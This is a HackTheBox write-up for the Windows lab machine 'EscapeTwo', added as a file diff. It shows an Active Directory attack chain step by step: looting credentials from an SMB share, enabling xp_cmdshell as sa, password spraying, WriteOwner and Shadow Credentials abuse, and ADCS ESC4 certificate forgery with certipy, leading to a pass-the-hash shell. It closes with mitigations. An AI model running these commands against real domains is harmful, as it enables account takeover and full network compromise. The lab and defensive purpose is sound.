@@ -1,0 +1,265 @@
+---
+title: "EscapeTwo"
+platform: "HackTheBox"
+os: "Windows"
+difficulty: "Easy"
+date: 2026-10-18
+ports: ["389/ldap", "445/smb", "636/ldaps", "1433/mssql", "3268/ldap-gc", "5985/winrm"]
+tags: ["active-directory", "mssql", "adcs", "esc4", "password-reuse", "acl-abuse", "assumed-breach"]
+summary: "An Active Directory DC in assumed-breach mode. From an initial set of credentials to Domain Admin by chaining a credential leak in an SMB share, MSSQL abuse with xp_cmdshell, password reuse via password spraying, ACL abuse (WriteOwner) and exploitation of a vulnerable certificate template in ADCS (ESC4)."
+---
+
+## Summary
+
+EscapeTwo is a **Windows (Active Directory)** machine of *Easy* difficulty in **assumed breach** mode: the platform hands over a low-privilege credential (`rose`) and the goal is to escalate up to **Domain Admin**.
+
+The full attack chain:
+
+1. **SMB enumeration** with `rose` → a non-standard *Accounting Department* share with an Excel file that leaks credentials.
+2. **MSSQL** as `sa` → `xp_cmdshell` → command execution as the service account `sql_svc`.
+3. Reading the SQL Server install file → **cleartext password for `sql_svc`**.
+4. **Password spraying** → `ryan` reuses `sql_svc`'s password.
+5. **ACL abuse**: `ryan` has `WriteOwner` over `ca_svc` → takeover of the account.
+6. **ADCS / ESC4**: `ca_svc` (member of *Cert Publishers*) can reconfigure a vulnerable certificate template → `Administrator` certificate → NT hash → shell as Domain Admin.
+
+<AttackChain
+  tag="ESC4"
+  label="from an Excel to Domain Admin"
+  steps={[
+    { title: 'SMB · Accounting Department', desc: 'An Excel in a non-standard share leaks the sa (MSSQL) password.', action: 'sa login → xp_cmdshell' },
+    { title: 'MSSQL · RCE', desc: 'Commands as sql_svc; the install file keeps its password in cleartext.', action: 'password spraying' },
+    { title: 'ryan', desc: 'sql_svc reuses the password with the user ryan.', action: 'ACL: WriteOwner over ca_svc' },
+    { title: 'ca_svc', desc: 'WriteOwner → FullControl → Shadow Credentials → ca_svc hash.', action: 'ADCS: vulnerable template (ESC4)' },
+    { title: 'ESC4 → Domain Admin', desc: 'ca_svc reconfigures the template → Administrator certificate → NT hash.', tone: 'win' },
+  ]}
+/>
+
+<Callout type="note">
+The box's through-line is **credential reuse** between service accounts and person accounts. Every time you get a new password, the reflex should be to try it against the whole domain user list.
+</Callout>
+
+---
+
+## Reconnaissance
+
+### Port scan
+
+`nmap` reveals a classic **Domain Controller**. The key services:
+
+| Port | Service | Note |
+|--------|----------|------|
+| 1433 | MSSQL 2019 | Microsoft SQL Server 2019 RTM |
+| 3268 | LDAP (Global Catalog) | Confirms AD |
+| 445 | SMB | `signing:True`, `Null Auth:True` |
+| 5985 | WinRM | For a remote shell |
+| 389/636 | LDAP/LDAPS | |
+
+The MSSQL NTLM banner itself gives away the domain topology:
+
+- Domain: **sequel.htb**
+- Host: **DC01.sequel.htb**
+
+### Prep
+
+```bash
+echo "10.129.232.128  sequel.htb DC01.sequel.htb DC01" | sudo tee -a /etc/hosts
+```
+
+### Anonymous LDAP
+
+The `RootDSE` is readable without authenticating and confirms the *naming contexts* (`DC=sequel,DC=htb`, `Configuration`, `Schema`, `DomainDnsZones`, `ForestDnsZones`). Useful for pinning down the *base DN* of later queries.
+
+<Callout type="tip">
+LDAP listing the RootDSE *naming contexts* does **not** mean it lets you read inside them. They're different things: the index is always visible; the content depends on whether there's an *anonymous bind* with read access.
+</Callout>
+
+---
+
+## Foothold
+
+### Credential validation
+
+With the initial credentials (`rose`), you validate service by service with `netexec`:
+
+```bash
+nxc smb   sequel.htb -u 'rose' -p '<pass>'   # [+] OK  → reads shares
+nxc winrm sequel.htb -u 'rose' -p '<pass>'   # [-] no  → no direct shell
+nxc mssql sequel.htb -u 'rose' -p '<pass>'   # [+] OK  → SQL login
+nxc ldap  sequel.htb -u 'rose' -p '<pass>'   # [+] OK  → BloodHound
+```
+
+`rose` can read, but **has no WinRM** → we have to mine information.
+
+### Credential leak in SMB
+
+```bash
+nxc smb sequel.htb -u 'rose' -p '<pass>' --shares
+```
+
+A **non-standard** share appears: *Accounting Department* (READ). Inside, an Excel file (`.xlsx`).
+
+```bash
+smbclient "//sequel.htb/Accounting Department" -U 'sequel.htb\rose%<pass>'
+# recurse ON; prompt OFF; mget *
+```
+
+An `.xlsx` is a ZIP: the quick way to read its text without opening LibreOffice is to extract `sharedStrings.xml`:
+
+```bash
+unzip -o accounting.xlsx -d dump/
+cat dump/xl/sharedStrings.xml | sed 's/<[^>]*>/\n/g' | grep -v '^$'
+```
+
+The sheet contains a table of users with passwords, including the **`sa`** account (SQL Server's System Administrator) with its password.
+
+<Callout type="warning">
+`sa` is the superadmin of the **SQL engine**, not a Windows account. Seeing it next to people's emails in an "accounting" sheet is the hint that the path goes through MSSQL.
+</Callout>
+
+### MSSQL → RCE with xp_cmdshell
+
+The `sa` password validates against SQL (**local** login, hence `--local-auth`):
+
+```bash
+nxc mssql sequel.htb -u 'sa' -p '<pass_sa>' --local-auth
+# [+] (Pwn3d!)
+```
+
+Since `sa` is sysadmin, we enable `xp_cmdshell` and run OS commands:
+
+```sql
+EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
+EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
+EXEC xp_cmdshell 'whoami';   -- sequel\sql_svc
+```
+
+<Callout type="note">
+You authenticate **as `sa`** (SQL login), but OS commands run under the service's Windows account: **`sequel\sql_svc`**. `sa` is the means (RCE), not the destination.
+</Callout>
+
+`whoami /priv` shows there's **no** `SeImpersonatePrivilege` → the local *Potato*-style privesc is ruled out. The path is via **AD relationships**.
+
+### sql_svc password in the install file
+
+SQL Server leaves the install response file with cleartext credentials:
+
+```bash
+nxc mssql sequel.htb -u 'sa' -p '<pass_sa>' --local-auth \
+  -x "type C:\SQL2019\ExpressAdv_ENU\sql-Configuration.INI"
+```
+
+```ini
+SQLSVCACCOUNT="SEQUEL\sql_svc"
+SQLSVCPASSWORD="<pass_sql_svc>"      ; <-- cleartext
+SQLSYSADMINACCOUNTS="SEQUEL\Administrator"
+```
+
+Unlike `sa`, **`sql_svc` is a domain account** → a reusable credential.
+
+---
+
+## Privilege escalation
+
+### Password spraying → ryan
+
+The key reflex: try `sql_svc`'s password against **all** the domain users.
+
+```bash
+nxc smb sequel.htb -u 'sql_svc' -p '<pass_sql_svc>' --users | awk '{print $5}' > users.txt
+nxc smb sequel.htb -u users.txt -p '<pass_sql_svc>' --continue-on-success
+```
+
+Result: **`ryan` reuses the same password** as `sql_svc`.
+
+<Callout type="tip">
+`--continue-on-success` is essential: without it, `netexec` stops at the first hit and you miss other accounts reusing the same key.
+</Callout>
+
+### ACL abuse: WriteOwner over ca_svc
+
+BloodHound (marking `rose`/`sql_svc`/`ryan` as *Owned*) reveals that **`ryan` has `WriteOwner` over `ca_svc`**. `WriteOwner` is a permission, not an access: it has to be turned into effective control through a three-step chain.
+
+```bash
+# 1. Become owner of ca_svc
+owneredit.py -action write -new-owner 'ryan' -target 'ca_svc' 'sequel.htb'/'ryan':'<pass>'
+
+# 2. Grant yourself FullControl over ca_svc
+dacledit.py -action write -rights FullControl -principal 'ryan' -target 'ca_svc' 'sequel.htb'/'ryan':'<pass>'
+
+# 3. Take control of the account via Shadow Credentials (without cracking the password)
+certipy-ad shadow auto -u 'ryan@sequel.htb' -p '<pass>' -account 'ca_svc' -dc-ip 10.129.232.128
+# -> returns ca_svc's NT hash
+```
+
+<Callout type="note">
+**Shadow Credentials** abuses `msDS-KeyCredentialLink` to authenticate via PKINIT without changing the victim's password. Cleaner and more reversible than a password change — important in a real pentest.
+</Callout>
+
+### ADCS — ESC4
+
+With `ca_svc`'s hash, we enumerate the CA. The template **DunderMifflinAuthentication** comes up flagged as vulnerable to **ESC4**:
+
+```bash
+certipy-ad find -u 'ca_svc@sequel.htb' -hashes '<hash_ca_svc>' \
+  -dc-ip 10.129.232.128 -vulnerable -stdout
+```
+
+```
+Template Name : DunderMifflinAuthentication
+Client Authentication : True
+Certificate Name Flag : SubjectAltRequireDns   ; <-- requires DNS in the SAN
+[!] Vulnerabilities
+    ESC4 : User has dangerous permissions.
+```
+
+**ESC4** = the controlled account (`ca_svc`, member of *Cert Publishers*) has **write** permissions over the template. If you can rewrite the rules, the rules don't limit you: the template is reconfigured to turn it into an **ESC1** (allow an arbitrary SAN).
+
+```bash
+# 1. Reconfigure the template (make it vulnerable, saving a backup)
+certipy-ad template -u 'ca_svc@sequel.htb' -hashes '<hash_ca_svc>' \
+  -template 'DunderMifflinAuthentication' -dc-ip 10.129.232.128 -save-configuration before.json
+
+# 2. Request a certificate impersonating Administrator
+certipy-ad req -u 'ca_svc@sequel.htb' -hashes '<hash_ca_svc>' \
+  -ca 'sequel-DC01-CA' -template 'DunderMifflinAuthentication' \
+  -upn 'administrator@sequel.htb' -dc-ip 10.129.232.128
+
+# 3. Authenticate with the certificate -> Administrator's NT hash
+certipy-ad auth -pfx 'administrator.pfx' -dc-ip 10.129.232.128
+```
+
+<Callout type="warning">
+If step 2 fails with `CERTSRV_E_SUBJECT_DNS_REQUIRED`, the template **wasn't reconfigured** in step 1 and still requires a DNS name (`SubjectAltRequireDns`). The fix isn't to change the `req`, but to make sure the `template` was applied. Also mind the syntax: **Certipy v5 changed the ESC4 flags** relative to v4 — check with `certipy-ad template -h`.
+</Callout>
+
+### Domain Admin
+
+`certipy auth` returns `Administrator`'s NTLM hash in `LM:NT` format. For `evil-winrm` you use **only the NT part**:
+
+```bash
+evil-winrm -i sequel.htb -u Administrator -H <hash_NT>
+```
+
+<Callout type="tip">
+`evil-winrm` gives `Invalid hash format` if you pass the full pair `aad3b4...:NT`. The `aad3b435b51404eeaad3b435b51404ee` is the empty LM (a constant): keep only the 32-hex NT.
+</Callout>
+
+Access as **Domain Admin**. Both flags captured. As final hygiene, the template is restored to its original configuration:
+
+```bash
+certipy-ad template -u 'ca_svc@sequel.htb' -hashes '<hash_ca_svc>' \
+  -template 'DunderMifflinAuthentication' -configuration before.json
+```
+
+---
+
+## Lessons and mitigations
+
+| # | Problem | Mitigation |
+|---|----------|------------|
+| 1 | Cleartext credentials in a readable SMB share (accounting Excel) | Don't store secrets in shared files; segment share permissions by real need |
+| 2 | `sa` account with a weak password and `xp_cmdshell` available | Disable `sa`, use Windows integrated authentication, keep `xp_cmdshell` disabled |
+| 3 | Service account password in cleartext in `sql-Configuration.INI` | Delete install files after deployment; rotate the service credential |
+| 4 | Password reuse between `sql_svc` and `ryan` | Unique passwords per account; use gMSA for service accounts |
+| 5 | Excessive ACL: a user's `WriteOwner` over a CA service account | Review and restrict ACLs over sensitive objects; audit with BloodHound |
+| 6 | Certificate template reconfigurable by *Cert Publishers* (ESC4) | Restrict write permissions over templates to PKI administrators; audit ADCS with Certipy |
